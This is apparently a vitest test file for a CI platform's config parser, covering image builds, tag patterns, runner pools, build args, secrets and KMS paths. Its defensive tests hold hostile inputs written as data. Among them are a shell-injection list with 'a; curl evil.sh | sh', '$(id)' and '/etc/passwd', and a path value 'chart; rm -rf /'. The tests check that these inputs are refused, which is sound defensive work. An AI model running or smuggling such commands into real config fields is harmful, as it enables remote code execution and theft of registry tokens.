import {
	BUILDABLE_ARCHES,
	isBuildableArch,
	KINDS,
	PlatformConfigError,
	parsePlatformConfig,
	resolveTag,
	runnerPoolFor,
	validatePlatformConfig,
} from "@hanzo/platform/services/ci/platform-config";
import { describe, expect, it } from "vitest";

const VALID = `
build:
  matrix:
    - { os: linux, arch: amd64 }
    - { os: linux, arch: arm64 }
  dockerfile: ./Dockerfile
  context: .
  image: ghcr.io/hanzoai/zip
  tag-pattern: "{{git.sha}}"
  push: true
deploy:
  on:
    - main
  target:
    cluster: hanzo-k8s
    namespace: hanzo
    operator: hanzo-operator
    crd: Service
    name: zip
`;

/**
 * Parse a config that MUST declare a build, and fail the test if it does not.
 *
 * `parsePlatformConfig` returns null for a document that declares nothing for
 * the build lane — empty, comments-only, or `test:`-only — which is a real state
 * this suite covers explicitly below. Every OTHER case here is about a config
 * that does declare one, so asserting it up front keeps those tests reading as
 * statements about builds rather than about null-checks.
 */
function built(yamlText: string) {
	const cfg = parsePlatformConfig(yamlText);
	if (!cfg)
		throw new Error(`expected a build declaration, got none:\n${yamlText}`);
	return cfg;
}

/** {@link built}, for the pre-parsed-object form. */
function declared(raw: unknown) {
	const cfg = validatePlatformConfig(raw);
	if (!cfg) throw new Error("expected a build declaration, got none");
	return cfg;
}

describe("parsePlatformConfig", () => {
	it("parses a full valid config", () => {
		const cfg = built(VALID);
		expect(cfg.builds).toHaveLength(1);
		expect(cfg.builds[0]!.matrix).toHaveLength(2);
		expect(cfg.builds[0]!.image).toBe("ghcr.io/hanzoai/zip");
		expect(cfg.builds[0]!.push).toBe(true);
		expect(cfg.deploy?.target.name).toBe("zip");
		expect(cfg.deploy?.target.crd).toBe("Service");
	});

	it("applies defaults for optional build fields", () => {
		const cfg = built(`
build:
  matrix:
    - { os: linux, arch: amd64 }
  image: ghcr.io/hanzoai/base
`);
		expect(cfg.builds[0]!.dockerfile).toBe("./Dockerfile");
		expect(cfg.builds[0]!.context).toBe(".");
		expect(cfg.builds[0]!.tagPattern).toBe("{{git.sha}}");
		expect(cfg.builds[0]!.push).toBe(true);
		expect(cfg.deploy).toBeUndefined();
	});

	it("rejects a missing build block", () => {
		expect(() => parsePlatformConfig("deploy: {}")).toThrow(
			PlatformConfigError,
		);
	});

	// A config that declares NOTHING for the build lane is a real, deliberate
	// state, not a malformed one — and treating it as an error is what made 54
	// repos answer every push with a 500 once the forge started delivering.
	//
	// `hanzo.yml` is the estate's ONE CI manifest with TWO readers: hanzoai/ci
	// runs its `test:` gate, platform builds its `images:`. Declaring tests and no
	// image is therefore complete. hanzoai/cloud's config says so in prose ("NO
	// images: lane HERE ... CI's only job here is the TEST GATE"), and
	// hanzo/insights' `.platform.yml` is comments-only, ending "No build/deploy
	// stanza: this repo produces no served surface".
	it("reads a test-only config as nothing to build, not as an error", () => {
		expect(parsePlatformConfig("test:\n  - go test ./...\n")).toBeNull();
	});

	it("reads a comments-only config as nothing to build", () => {
		expect(parsePlatformConfig("# no build/deploy stanza\n")).toBeNull();
	});

	it("reads an empty config as nothing to build", () => {
		expect(parsePlatformConfig("")).toBeNull();
	});

	// The distinction that keeps the above from swallowing real mistakes: silence
	// about builds is a choice, a rollout of nothing is incoherent.
	it("still rejects a deploy: with nothing to build", () => {
		expect(() =>
			parsePlatformConfig(
				"deploy:\n  on: [main]\n  target:\n    cluster: c\n    namespace: n\n    operator: hanzo-operator\n    name: x\n",
			),
		).toThrow(PlatformConfigError);
	});

	// A declared image that is missing a required field is a mistake, and must
	// stay loud — hanzo-fi/ledger and hanzoai/operator both hit exactly this.
	it("still rejects an image entry with no repo", () => {
		expect(() =>
			parsePlatformConfig("images:\n  - name: ledger\n    context: .\n"),
		).toThrow(/repo/);
	});

	// A document that parses to a scalar or a list is malformed, not silent.
	it("still rejects a non-mapping document", () => {
		expect(() => parsePlatformConfig("just a string")).toThrow(/YAML mapping/);
	});

	it("rejects an empty matrix", () => {
		expect(() =>
			validatePlatformConfig({ build: { matrix: [], image: "x/y" } }),
		).toThrow(/non-empty list/);
	});

	it("rejects an invalid os", () => {
		expect(() =>
			validatePlatformConfig({
				build: { matrix: [{ os: "plan9", arch: "amd64" }], image: "x/y" },
			}),
		).toThrow(/os must be one of/);
	});

	it("rejects an invalid arch", () => {
		expect(() =>
			validatePlatformConfig({
				build: { matrix: [{ os: "linux", arch: "riscv" }], image: "x/y" },
			}),
		).toThrow(/arch must be one of/);
	});

	it("rejects a tag on the image", () => {
		expect(() =>
			validatePlatformConfig({
				build: { matrix: [{ os: "linux", arch: "amd64" }], image: "x/y:v1" },
			}),
		).toThrow(/bare repository/);
	});

	it("rejects duplicate matrix entries", () => {
		expect(() =>
			validatePlatformConfig({
				build: {
					matrix: [
						{ os: "linux", arch: "amd64" },
						{ os: "linux", arch: "amd64" },
					],
					image: "x/y",
				},
			}),
		).toThrow(/duplicate target/);
	});

	it("rejects an unsupported operator", () => {
		expect(() =>
			validatePlatformConfig({
				build: { matrix: [{ os: "linux", arch: "amd64" }], image: "x/y" },
				deploy: {
					on: ["main"],
					target: {
						cluster: "c",
						namespace: "n",
						operator: "argocd",
						crd: "Service",
						name: "x",
					},
				},
			}),
		).toThrow(/operator must be one of/);
	});

	it("rejects legacy HanzoService CRD", () => {
		expect(() =>
			validatePlatformConfig({
				build: { matrix: [{ os: "linux", arch: "amd64" }], image: "x/y" },
				deploy: {
					on: ["main"],
					target: {
						cluster: "c",
						namespace: "n",
						operator: "hanzo-operator",
						crd: "HanzoService",
						name: "x",
					},
				},
			}),
		).toThrow(/one way only/);
	});

	it("accepts the App CRD — the kind the fleet actually runs", () => {
		const cfg = declared({
			build: { matrix: [{ os: "linux", arch: "amd64" }], image: "x/y" },
			deploy: {
				on: ["main"],
				target: {
					cluster: "hanzo-k8s",
					namespace: "hanzo",
					operator: "hanzo-operator",
					crd: "App",
					name: "cloud",
				},
			},
		});
		expect(cfg.deploy?.target.crd).toBe("App");
	});

	it("defaults an omitted crd to App", () => {
		// `App` is ~99% of the fleet, so omitting the kind must not be an error.
		const cfg = declared({
			build: { matrix: [{ os: "linux", arch: "amd64" }], image: "x/y" },
			deploy: {
				on: ["main"],
				target: {
					cluster: "hanzo-k8s",
					namespace: "hanzo",
					operator: "hanzo-operator",
					name: "cloud",
				},
			},
		});
		expect(cfg.deploy?.target.crd).toBe("App");
	});

	it("rejects a datastore kind as a deploy target", () => {
		expect(() =>
			validatePlatformConfig({
				build: { matrix: [{ os: "linux", arch: "amd64" }], image: "x/y" },
				deploy: {
					on: ["main"],
					target: {
						cluster: "c",
						namespace: "n",
						operator: "hanzo-operator",
						crd: "SQL",
						name: "x",
					},
				},
			}),
		).toThrow(/must be one of App, Service/);
	});

	it("rejects non-YAML", () => {
		expect(() => parsePlatformConfig(":\n  - [")).toThrow(PlatformConfigError);
	});
});

const MULTI_IMAGE = `
images:
  - { name: api, context: ./api, repo: ghcr.io/bootnode/bootnode, tag-suffix: api }
  - { name: web, context: ./web, repo: ghcr.io/bootnode/bootnode, tag-suffix: web }
test:
  - { name: api, run: "pytest -q" }
kms: { path: /deploy, environment: prod }
`;

describe("images (hanzo.yml multi-image)", () => {
	it("parses a list of images into builds", () => {
		const cfg = built(MULTI_IMAGE);
		expect(cfg.builds).toHaveLength(2);
		expect(cfg.builds[0]!.name).toBe("api");
		expect(cfg.builds[0]!.image).toBe("ghcr.io/bootnode/bootnode");
		expect(cfg.builds[0]!.context).toBe("./api");
		expect(cfg.builds[0]!.dockerfile).toBe("./api/Dockerfile");
		expect(cfg.builds[0]!.tagPattern).toBe("{{git.sha}}-amd64-api");
		expect(cfg.builds[1]!.name).toBe("web");
		// default matrix is linux/amd64
		expect(cfg.builds[0]!.matrix).toEqual([{ os: "linux", arch: "amd64" }]);
		// `test`/`kms` keys are ignored by the platform; deploy via cicd/universe
		expect(cfg.deploy).toBeUndefined();
	});
	it("honours tag-pattern, so a release can be a version", () => {
		// The legacy `build:` block read this key and `images:` did not, so on the
		// modern form a declared semver was accepted by the schema and silently
		// discarded — four of universe's image pins name a commit because of it.
		const cfg = built(`
images:
  - { name: base, context: ., repo: ghcr.io/hanzoai/base, tag-pattern: "{{git.tag}}" }
`);
		expect(cfg.builds[0]!.tagPattern).toBe("{{git.tag}}");
		// And it resolves the way the legacy form does: a version on a tag push,
		// and NOTHING on a branch push, so main never publishes a bare `{{git.tag}}`.
		expect(
			resolveTag(cfg.builds[0]!.tagPattern, {
				sha: "abc1234",
				ref: "refs/tags/v1.2.3",
			}),
		).toBe("v1.2.3");
		expect(
			resolveTag(cfg.builds[0]!.tagPattern, {
				sha: "abc1234",
				ref: "refs/heads/main",
			}),
		).toBeNull();
	});
	it("leaves an image that declares no tag-pattern exactly as it was", () => {
		// The whole fleet is on the default, so widening what CAN be declared must
		// move nothing that is. Pinned per-suffix, and suffix-defaults-to-name.
		const cfg = built(MULTI_IMAGE);
		expect(cfg.builds[0]!.tagPattern).toBe("{{git.sha}}-amd64-api");
		expect(cfg.builds[1]!.tagPattern).toBe("{{git.sha}}-amd64-web");
		const bare = built(`
images:
  - { name: solo, context: ., repo: ghcr.io/hanzoai/solo }
`);
		expect(bare.builds[0]!.tagPattern).toBe("{{git.sha}}-amd64-solo");
	});
	it("rejects an empty images list", () => {
		expect(() => validatePlatformConfig({ images: [] })).toThrow(/non-empty/);
	});
	it("rejects a tag in images[].repo", () => {
		expect(() =>
			validatePlatformConfig({ images: [{ name: "a", repo: "x/y:v1" }] }),
		).toThrow(/bare repository/);
	});
	it("rejects duplicate image names", () => {
		expect(() =>
			validatePlatformConfig({
				images: [
					{ name: "api", repo: "x/y" },
					{ name: "api", repo: "x/z" },
				],
			}),
		).toThrow(/duplicate image name/);
	});
	it("treats a Deployment-style deploy (services) as build-only", () => {
		const cfg = declared({
			images: [{ name: "api", repo: "x/y" }],
			deploy: { on: ["main"], cluster: "c", namespace: "n", services: [] },
		});
		expect(cfg.builds).toHaveLength(1);
		expect(cfg.deploy).toBeUndefined();
	});
});

// `kind:` (HIP-0138) names how a project arrives. The whole point is that the
// three chart kinds deliver something WITHOUT an `images:` block — and an
// `images:`-less document is exactly what the test-only case above reads as
// "nothing here for me". Without `kind`, a chart repository and a test-gate
// repository are the same document, so a declaration would be ignored rather
// than refused.
describe("kind", () => {
	it("is the closed set of five arrivals", () => {
		expect([...KINDS]).toEqual(["image", "fn", "chart", "compose", "universe"]);
	});

	it("defaults to image, so every manifest written before it is unchanged", () => {
		expect(built(MULTI_IMAGE).kind).toBe("image");
		expect(built(VALID).kind).toBe("image");
	});

	it("refuses a kind it does not know rather than guessing one", () => {
		expect(() => parsePlatformConfig("kind: helm\n")).toThrow(
			/kind must be one of image, fn, chart, compose, universe/,
		);
	});

	it.each([
		["chart", "chart"],
		["compose", "compose.yml"],
		["universe", "charts"],
	])("reads kind: %s as a delivery with nothing to build", (kind, path) => {
		const cfg = built(`kind: ${kind}\ntest:\n  - { name: t, run: "true" }\n`);
		expect(cfg.kind).toBe(kind);
		expect(cfg.path).toBe(path);
		expect(cfg.builds).toEqual([]);
	});

	// `fn` differs from `image` only in which BuildKit frontend runs and which CR
	// receives the result, so it reads the same `images:` block and is silent for
	// the same reason when there is none.
	it("reads kind: fn through the image lane", () => {
		const cfg = built(
			"kind: fn\nimages:\n  - { name: resize, repo: ghcr.io/hanzoai/resize }\n",
		);
		expect(cfg.kind).toBe("fn");
		expect(cfg.path).toBe(".");
		expect(cfg.builds[0]!.context).toBe(".");
	});

	it("still reads a kind-less test-only config as nothing to build", () => {
		expect(parsePlatformConfig("test:\n  - go test ./...\n")).toBeNull();
	});

	it("takes an explicit path over the per-kind default", () => {
		expect(built("kind: chart\npath: deploy/chart\n").path).toBe(
			"deploy/chart",
		);
	});

	// `path` addresses a checkout the same way `kms.path` addresses a folder, so
	// it carries the same charset and the same refusal to ascend.
	it.each(["../../etc", "/etc/passwd", "chart; rm -rf /"])(
		"refuses a path that leaves the repo or carries a shell metacharacter: %s",
		(path) => {
			expect(() =>
				parsePlatformConfig(`kind: chart\npath: ${JSON.stringify(path)}\n`),
			).toThrow(PlatformConfigError);
		},
	);
});

describe("runnerPoolFor", () => {
	it("maps hanzoai/linux/amd64 to the real ARC pool hanzo-build-linux-amd64", () => {
		expect(runnerPoolFor("hanzoai", { os: "linux", arch: "amd64" })).toBe(
			"hanzo-build-linux-amd64",
		);
	});
	it("lands both spellings of the Hanzo org on the one pool", () => {
		// The forge owner is `hanzo` and the org login is `hanzoai`. The pool is
		// the one place either spelling means anything, and it is one pool.
		expect(runnerPoolFor("hanzo", { os: "linux", arch: "amd64" })).toBe(
			runnerPoolFor("hanzoai", { os: "linux", arch: "amd64" }),
		);
	});
	it("maps org login to brand prefix (luxfi→lux, zooai→zoo)", () => {
		expect(runnerPoolFor("luxfi", { os: "linux", arch: "amd64" })).toBe(
			"lux-build-linux-amd64",
		);
		expect(runnerPoolFor("zooai", { os: "linux", arch: "amd64" })).toBe(
			"zoo-build-linux-amd64",
		);
	});
	it("defaults an unmapped org to its own login as brand", () => {
		expect(runnerPoolFor("hanzobot", { os: "linux", arch: "amd64" })).toBe(
			"hanzobot-build-linux-amd64",
		);
	});
	it("routes bootnode (no runners of its own) to the shared hanzo build pool", () => {
		expect(runnerPoolFor("bootnode", { os: "linux", arch: "amd64" })).toBe(
			"hanzo-build-linux-amd64",
		);
	});
	it("maps darwin to macos", () => {
		expect(runnerPoolFor("hanzoai", { os: "darwin", arch: "arm64" })).toBe(
			"hanzo-build-macos-arm64",
		);
	});
	it("honors an explicit deploy role", () => {
		expect(
			runnerPoolFor("hanzoai", { os: "linux", arch: "amd64" }, "deploy"),
		).toBe("hanzo-deploy-linux-amd64");
	});
});

describe("resolveTag", () => {
	const MAIN = "refs/heads/main";

	it("substitutes git.sha", () => {
		expect(resolveTag("{{git.sha}}", { sha: "abc123", ref: MAIN })).toBe(
			"abc123",
		);
	});

	it("sanitizes sha in tag", () => {
		expect(
			resolveTag("{{git.sha}}", {
				sha: "abc1234,name=ghcr.io/luxfi/node:v1",
				ref: MAIN,
			}),
		).toBe("abc1234-name-ghcr.io-luxfi-node-v1");
	});

	// What comes out is a docker tag, and a docker tag is [A-Za-z0-9._-]. Both
	// tokens are spelled in that alphabet, so the resolver's output is a tag
	// whatever the triggering context said. The tag names an image and the image
	// name is one field of the exporter the build muscle writes, so a comma or an
	// `=` is part of no name this can produce.
	it("spells every token with the same alphabet", () => {
		for (const [pattern, ctx] of [
			["{{git.sha}}", { sha: "a,b=c d/e", ref: MAIN }],
			["{{git.tag}}", { sha: "x", ref: "refs/tags/a,b=c d/e" }],
		] as const) {
			expect(resolveTag(pattern, ctx), pattern).toBe("a-b-c-d-e");
		}
	});

	// {{git.tag}} exists so a repo can publish a semver image on a `v*` push —
	// the capability GitHub Actions provided before repos moved to platform.
	it("substitutes git.tag on a tag push", () => {
		expect(
			resolveTag("{{git.tag}}", { sha: "x", ref: "refs/tags/v0.9.4" }),
		).toBe("v0.9.4");
	});

	it("sanitizes the tag", () => {
		expect(
			resolveTag("{{git.tag}}", { sha: "x", ref: "refs/tags/release/1.0 rc1" }),
		).toBe("release-1.0-rc1");
	});

	// Skip, don't invent: falling back to the branch would give one token two
	// meanings and publish a branch image under a version-shaped name.
	it("returns null for {{git.tag}} on a branch push", () => {
		expect(resolveTag("{{git.tag}}", { sha: "x", ref: MAIN })).toBeNull();
	});

	it("leaves a sha pattern unaffected by which ref it was", () => {
		for (const ref of [MAIN, "refs/tags/v1.0.0"]) {
			expect(resolveTag("{{git.sha}}", { sha: "abc", ref }), ref).toBe("abc");
		}
	});

	// A branch head is the one git name that moves. Every name it could spell is
	// one an image must not carry: an ordinary branch name moves under whatever
	// it published, and a branch NAMED like a version publishes a release from
	// something that is not one. So there is no token for it, and a config asking
	// for one is refused where it is read rather than resolved to a literal.
	it("has no branch token, and refuses a config that asks for one", () => {
		expect(resolveTag("{{git.branch}}", { sha: "x", ref: MAIN })).toBe(
			"{{git.branch}}",
		);
		expect(() =>
			parsePlatformConfig(`
build:
  matrix:
    - { os: linux, arch: amd64 }
  image: ghcr.io/luxfi/node
  tag-pattern: "{{git.branch}}"
`),
		).toThrow(/not a tag token/i);
	});

	it("refuses a pattern that spells no token at all", () => {
		// A pattern is a template. One with no variable is a constant, and a
		// constant is the same image name on every push — `v1.2.3` published from
		// `main` and from a side branch is one tag over two commits. Version-shaped
		// names pass every rule downstream, because downstream reads the RESOLVED
		// name and a version is exactly what it wants to see.
		for (const pattern of ["v1.2.3", "latest", "1.2.3-latest"]) {
			expect(
				() =>
					parsePlatformConfig(`
images:
  - { name: api, context: ., repo: ghcr.io/hanzoai/api, tag-pattern: "${pattern}" }
`),
				pattern,
			).toThrow(/names the same image on every push/i);
		}
	});

	it("keeps every pattern that spells one, decoration and all", () => {
		// The rule is about the token, not about the shape of what surrounds it:
		// a prerelease suffix is a legitimate part of a version a tag push spells.
		for (const pattern of [
			"{{git.tag}}",
			"{{git.sha}}",
			"sha-{{git.sha}}",
			"{{git.sha}}-amd64-api",
			"v{{git.tag}}-rc.1",
		]) {
			expect(
				parsePlatformConfig(`
images:
  - { name: api, context: ., repo: ghcr.io/hanzoai/api, tag-pattern: "${pattern}" }
`)?.builds[0]?.tagPattern,
				pattern,
			).toBe(pattern);
		}
	});

	it("refuses any token it cannot answer for", () => {
		// A pattern is a template, so an unknown token survives substitution and
		// becomes part of an image name. Refusing names the tokens that exist,
		// which is the sentence the author of that line needs.
		for (const token of ["{{git.ref}}", "{{env.HOME}}", "{{}}"]) {
			expect(
				() =>
					parsePlatformConfig(`
images:
  - { name: api, context: ., repo: ghcr.io/hanzoai/api, tag-pattern: "${token}" }
`),
				token,
			).toThrow(/not a tag token/i);
		}
	});
});

describe("buildable arch gate (arm64 paused)", () => {
	it("amd64 is buildable", () => {
		expect(isBuildableArch("amd64")).toBe(true);
	});
	it("arm64 is NOT buildable while paused (no DOKS arm64 pool)", () => {
		expect(isBuildableArch("arm64")).toBe(false);
	});
	it("BUILDABLE_ARCHES is amd64-only", () => {
		expect([...BUILDABLE_ARCHES]).toEqual(["amd64"]);
		expect(BUILDABLE_ARCHES).not.toContain("arm64");
	});
	it("a config may still DECLARE arm64 (schema-valid) — the gate is runtime, not schema", () => {
		// A dual-arch config parses fine; the scheduler skips the arm64 entry at
		// dispatch time. Keeps validation and build-time policy orthogonal.
		const cfg = built(`
build:
  matrix:
    - { os: linux, arch: amd64 }
    - { os: linux, arch: arm64 }
  image: ghcr.io/hanzoai/zip
`);
		expect(cfg.builds[0]!.matrix.map((m) => m.arch)).toEqual([
			"amd64",
			"arm64",
		]);
		// Exactly one of the declared arches is currently buildable.
		expect(
			cfg.builds[0]!.matrix.filter((m) => isBuildableArch(m.arch)),
		).toHaveLength(1);
	});
});

describe("publish paths cannot inject shell", () => {
	const pub = (over: Record<string, unknown>) =>
		validatePlatformConfig({
			build: { matrix: [{ os: "linux", arch: "amd64" }], image: "x/y" },
			publish: { cargo: true, ...over },
		});

	it("🔴 REFUSES a crate path carrying shell metacharacters", () => {
		// cargoCrates is interpolated UNQUOTED into `for c in …` in the generated
		// publish script, so a metacharacter here is remote code execution in the
		// publish Job — which holds CARGO_REGISTRY_TOKEN / NPM_TOKEN / PYPI_TOKEN.
		for (const evil of [
			"a; curl evil.sh | sh",
			"$(id)",
			"`id`",
			"a|b",
			"a&b",
			"a\nb",
			'a"b',
			"a'b",
			"a b",
			"-flag",
			"/etc/passwd",
			"*",
		]) {
			expect(() => pub({ cargoCrates: [evil] })).toThrow(PlatformConfigError);
		}
	});

	it("REFUSES upward traversal in a crate path", () => {
		expect(() => pub({ cargoCrates: ["../../etc"] })).toThrow(
			/traverse upward/,
		);
		expect(() => pub({ cargoCrates: ["a/../../b"] })).toThrow(
			/traverse upward/,
		);
	});

	it("REFUSES the same in packageDir", () => {
		expect(() => pub({ packageDir: "../../etc" })).toThrow(/traverse upward/);
		expect(() => pub({ packageDir: "a; id" })).toThrow(PlatformConfigError);
	});

	it("still accepts ordinary workspace crate paths", () => {
		const cfg = pub({ cargoCrates: ["crates/core", "crates/cli", "."] });
		expect(cfg).not.toBeNull();
		expect(cfg?.publish?.cargoCrates).toEqual([
			"crates/core",
			"crates/cli",
			".",
		]);
		expect(pub({ packageDir: "packages/sdk" })?.publish?.packageDir).toBe(
			"packages/sdk",
		);
	});
});

/**
 * `args:` on an image entry selects WHAT THE IMAGE IS when a Dockerfile ends in
 * `FROM ${STAGE} AS final`. The parser used to read six keys and not this one,
 * so the value evaporated at parse time: all four hanzoai/bot sandbox classes
 * built the `ARG STAGE=desktop` default and were tagged exec/dev/desktop/admin
 * anyway. Nothing failed — the tags simply stopped meaning anything.
 *
 * hanzoai/ci's lane always piped `.args` into `--build-arg`, so the same
 * hanzo.yml produced different images through the two front doors.
 */
describe("per-image build args", () => {
	const withArgs = (args: string) =>
		parsePlatformConfig(
			`images:\n  - name: sandbox-dev\n    repo: oci.hanzo.ai/hanzoai/sandbox\n    dockerfile: Dockerfile.sandbox\n    tag-suffix: dev\n${args}`,
		);

	it("carries args: through to the build config", () => {
		const cfg = withArgs("    args:\n      STAGE: dev\n");
		expect(cfg?.builds[0]?.buildArgs).toEqual({ STAGE: "dev" });
	});

	it("defaults to no args when the key is absent", () => {
		expect(withArgs("")?.builds[0]?.buildArgs).toEqual({});
	});

	it("sorts keys so one commit yields one argv, and one cache key", () => {
		const cfg = withArgs("    args:\n      ZULU: z\n      ALPHA: a\n");
		expect(Object.keys(cfg?.builds[0]?.buildArgs ?? {})).toEqual([
			"ALPHA",
			"ZULU",
		]);
	});

	// A key is spliced into `--opt=build-arg:<key>=<value>`; one that is not an
	// ARG name would build a different option than it reads like.
	it("rejects a key that is not a Dockerfile ARG name", () => {
		expect(() => withArgs("    args:\n      'not a name': x\n")).toThrow(
			/ARG name/,
		);
	});

	it("rejects a non-string value", () => {
		expect(() => withArgs("    args:\n      STAGE: 3\n")).toThrow(/string/);
	});

	// One arg must stay one argv element.
	it("rejects a value carrying a newline", () => {
		expect(() => withArgs('    args:\n      STAGE: "a\\nb"\n')).toThrow(
			/control character/,
		);
	});
});

describe("build_secrets", () => {
	const withSecrets = (secrets: string) =>
		`images:\n  - name: app\n    repo: ghcr.io/hanzoai/app\n    build_secrets: [${secrets}]\n`;

	it("parses a publishable build_secret name", () => {
		expect(
			built(withSecrets("PUBLISHABLE_KEY")).builds[0]!.buildSecrets,
		).toEqual(["PUBLISHABLE_KEY"]);
	});

	it("accepts every documented publishable prefix and suffix", () => {
		expect(
			built(
				withSecrets(
					"NEXT_PUBLIC_X, VITE_Y, REACT_APP_Z, A_PUBLIC, B_PUBLISHABLE",
				),
			).builds[0]!.buildSecrets,
		).toEqual([
			"NEXT_PUBLIC_X",
			"VITE_Y",
			"REACT_APP_Z",
			"A_PUBLIC",
			"B_PUBLISHABLE",
		]);
	});

	it("defaults to an empty list when unset", () => {
		expect(
			built("images:\n  - name: app\n    repo: ghcr.io/hanzoai/app\n")
				.builds[0]!.buildSecrets,
		).toEqual([]);
	});

	it("REFUSES a non-publishable name — a real credential would leak to docker history", () => {
		expect(() => parsePlatformConfig(withSecrets("DATABASE_URL"))).toThrow(
			PlatformConfigError,
		);
		expect(() => parsePlatformConfig(withSecrets("API_SECRET"))).toThrow(
			/not publishable/,
		);
	});

	it("REFUSES a name that is not a Dockerfile ARG", () => {
		expect(() => parsePlatformConfig(withSecrets('"PUBLIC-DASH"'))).toThrow(
			/Dockerfile ARG name/,
		);
	});

	it("REFUSES a scalar where a list is required", () => {
		expect(() =>
			parsePlatformConfig(
				"images:\n  - name: app\n    repo: ghcr.io/hanzoai/app\n    build_secrets: PUBLISHABLE_KEY\n",
			),
		).toThrow(/must be a list/);
	});
});

describe("kms location", () => {
	const base = "images:\n  - name: app\n    repo: ghcr.io/hanzoai/app\n";

	it("is undefined when kms is absent (fetch defaults deploy/prod)", () => {
		expect(built(base).kms).toBeUndefined();
	});

	it("parses path and environment, trimming slashes", () => {
		expect(
			built(`${base}kms:\n  path: /custom/\n  environment: staging\n`).kms,
		).toEqual({ path: "custom", environment: "staging" });
	});

	it("defaults path=deploy env=prod when kms declares only org", () => {
		expect(built(`${base}kms:\n  org: hanzo\n`).kms).toEqual({
			path: "deploy",
			environment: "prod",
		});
	});

	/**
	 * The folder becomes a path segment in the KMS request, and a dot is the one
	 * character percent-encoding leaves alone — so a folder that traverses
	 * upward re-addresses the read, on the platform's own KMS principal. The
	 * value is repo-declared, so the rule belongs where the value is read.
	 */
	it("refuses a folder that traverses upward", () => {
		for (const folder of ["..", "../..", "a/../b", "deploy/.."]) {
			expect(() => built(`${base}kms:\n  path: ${folder}\n`), folder).toThrow(
				/traverse upward/,
			);
		}
	});

	it("refuses a folder carrying anything but a folder name", () => {
		for (const folder of ["a b", "a;b", "a$b", "-a", "a\\b", "a?b", "a#b"]) {
			expect(() => built(`${base}kms:\n  path: "${folder}"\n`), folder).toThrow(
				/must be a/,
			);
		}
	});

	it("still takes an ordinary nested folder", () => {
		expect(built(`${base}kms:\n  path: deploy/prod\n`).kms).toEqual({
			path: "deploy/prod",
			environment: "prod",
		});
	});
});
